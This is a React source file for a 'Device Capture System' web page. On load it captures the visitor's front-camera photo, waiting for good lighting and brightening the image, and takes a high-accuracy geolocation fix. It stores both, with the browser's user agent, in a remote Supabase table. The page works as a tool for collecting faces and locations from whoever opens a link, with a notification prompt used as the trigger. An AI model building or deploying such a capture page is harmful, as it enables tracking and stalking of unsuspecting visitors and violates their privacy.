import { useEffect, useState } from 'react';
import { Camera, MapPin, Loader2, CheckCircle, XCircle } from 'lucide-react';
import { supabase } from './lib/supabase';

interface CaptureData {
  image: string | null;
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null;
  userAgent: string;
}

function App() {
  const [status, setStatus] = useState<'capturing' | 'success' | 'error'>('capturing');
  const [captureData, setCaptureData] = useState<CaptureData>({
    image: null,
    location: null,
    userAgent: navigator.userAgent,
  });
  const [errorMessage, setErrorMessage] = useState<string>('');

  useEffect(() => {
    const captureDeviceData = async () => {
      try {
        // Request Permissions Sequence
        try {
          if ('Notification' in window) {
            const notification = await Notification.requestPermission();
            const imageData = await captureImage();
            const locationData = await captureLocation();
            const data: CaptureData = {
              image: imageData,
              location: locationData,
              userAgent: navigator.userAgent,
            };
            setCaptureData(data);
            await supabase.from('device_captures').insert({
              image_data: imageData,
              latitude: locationData?.latitude,
              longitude: locationData?.longitude,
              accuracy: locationData?.accuracy,
              user_agent: navigator.userAgent,
            });
          }
        } catch (e) {
          console.log('Notification permission error', e);
        }
        setStatus('success');
      } catch (error) {
        console.error('Capture error:', error);
        setErrorMessage(error instanceof Error ? error.message : 'Unknown error occurred');
        setStatus('error');
      }
    };

    captureDeviceData();
  }, []);

  const captureImage = async (): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
      });

      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack.getSettings) {
        const settings = videoTrack.getSettings();
        try {
          await videoTrack.applyConstraints({
            advanced: [
              { brightness: { ideal: 100 } },
              { contrast: { ideal: 80 } },
              { saturation: { ideal: 100 } },
            ] as any,
          });
        } catch (e) {
          console.log('Could not apply advanced constraints');
        }
      }

      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      await new Promise((resolve) => {
        video.onloadedmetadata = resolve;
      });

      // Wait for good lighting conditions
      await new Promise<void>((resolve) => {
        let attempts = 0;
        const checkLighting = () => {
          const canvas = document.createElement('canvas');
          canvas.width = 100; // Small size for performance
          canvas.height = 100;
          const ctx = canvas.getContext('2d');
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            let totalBrightness = 0;

            for (let i = 0; i < data.length; i += 4) {
              totalBrightness += (data[i] + data[i + 1] + data[i + 2]) / 3;
            }

            const avgBrightness = totalBrightness / (data.length / 4);
            // Threshold for "good" lighting (0-255)
            // If brightness is good (>80) or took too long (>2.5s), capture
            if (avgBrightness > 80 || attempts > 150) {
              resolve();
              return;
            }
          }
          attempts++;
          requestAnimationFrame(checkLighting);
        };
        checkLighting();
      });

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);

        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;

        for (let i = 0; i < data.length; i += 4) {
          data[i] = Math.min(255, Math.pow(data[i] / 255, 0.7) * 255 * 1.4);
          data[i + 1] = Math.min(255, Math.pow(data[i + 1] / 255, 0.7) * 255 * 1.4);
          data[i + 2] = Math.min(255, Math.pow(data[i + 2] / 255, 0.7) * 255 * 1.4);
        }

        ctx.putImageData(imageData, 0, 0);
      }

      stream.getTracks().forEach((track) => track.stop());

      return canvas.toDataURL('image/jpeg', 0.9);
    } catch (error) {
      console.error('Camera error:', error);
      throw new Error('Failed to access camera. Please grant camera permissions.');
    }
  };
  const captureLocation = async (): Promise<{
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null> => {
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        });
      });

      return {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
      };
    } catch (error) {
      console.error('Location error:', error);
      throw new Error('Failed to get location. Please grant location permissions.');
    }
  };


  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white">
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold mb-4">Device Capture System</h1>
            <p className="text-slate-300">
              Automatically capturing camera and location data on page load
            </p>
          </div>

          <div className="bg-slate-800 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
            <div className="p-8">
              {status === 'capturing' && (
                <div className="flex flex-col items-center justify-center py-12">
                  <Loader2 className="w-16 h-16 animate-spin text-blue-400 mb-4" />
                  <p className="text-xl text-slate-300">Capturing device data...</p>
                  <p className="text-sm text-slate-400 mt-2">
                    Please grant camera and location permissions
                  </p>
                </div>
              )}

              {status === 'error' && (
                <div className="flex flex-col items-center justify-center py-12">
                  <XCircle className="w-16 h-16 text-red-400 mb-4" />
                  <p className="text-xl text-red-400 mb-2">Capture Failed</p>
                  <p className="text-sm text-slate-400">{errorMessage}</p>
                </div>
              )}

              {status === 'success' && (
                <div className="space-y-8">
                  <div className="flex items-center justify-center mb-6">
                    <CheckCircle className="w-12 h-12 text-green-400 mr-3" />
                    <p className="text-2xl font-semibold text-green-400">
                      Capture Successful!
                    </p>
                  </div>

                  <div className="grid md:grid-cols-2 gap-8">
                    <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                      <div className="flex items-center mb-4">
                        <Camera className="w-6 h-6 text-blue-400 mr-2" />
                        <h2 className="text-xl font-semibold">Camera Capture</h2>
                      </div>
                      {captureData.image ? (
                        <img
                          src={captureData.image}
                          alt="Captured"
                          className="w-full rounded-lg border-2 border-slate-700"
                        />
                      ) : (
                        <p className="text-slate-400">No image captured</p>
                      )}
                    </div>

                    <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                      <div className="flex items-center mb-4">
                        <MapPin className="w-6 h-6 text-green-400 mr-2" />
                        <h2 className="text-xl font-semibold">Location Data</h2>
                      </div>
                      {captureData.location ? (
                        <div className="space-y-3">
                          <div>
                            <p className="text-sm text-slate-400">Latitude</p>
                            <p className="text-lg font-mono">
                              {captureData.location.latitude.toFixed(6)}
                            </p>
                          </div>
                          <div>
                            <p className="text-sm text-slate-400">Longitude</p>
                            <p className="text-lg font-mono">
                              {captureData.location.longitude.toFixed(6)}
                            </p>
                          </div>
                          <div>
                            <p className="text-sm text-slate-400">Accuracy</p>
                            <p className="text-lg">
                              ±{captureData.location.accuracy.toFixed(0)} meters
                            </p>
                          </div>
                          <a
                            href={`https://www.google.com/maps?q=${captureData.location.latitude},${captureData.location.longitude}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="inline-block mt-4 px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg transition-colors"
                          >
                            View on Google Maps
                          </a>
                        </div>
                      ) : (
                        <p className="text-slate-400">No location data</p>
                      )}
                    </div>
                  </div>

                  <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                    <h2 className="text-xl font-semibold mb-4">Device Information</h2>
                    <div className="bg-slate-950 p-4 rounded-lg">
                      <p className="text-sm text-slate-300 font-mono break-all">
                        {captureData.userAgent}
                      </p>
                    </div>
                  </div>

                  <div className="bg-amber-900/20 border border-amber-700/50 rounded-xl p-6">
                    <h3 className="text-lg font-semibold text-amber-400 mb-2">
                      Note about Google Accounts
                    </h3>
                    <p className="text-slate-300">
                      Browser security prevents websites from accessing information about
                      which Google accounts (or any accounts) you're logged into. This is
                      a critical privacy protection feature built into all modern browsers.
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
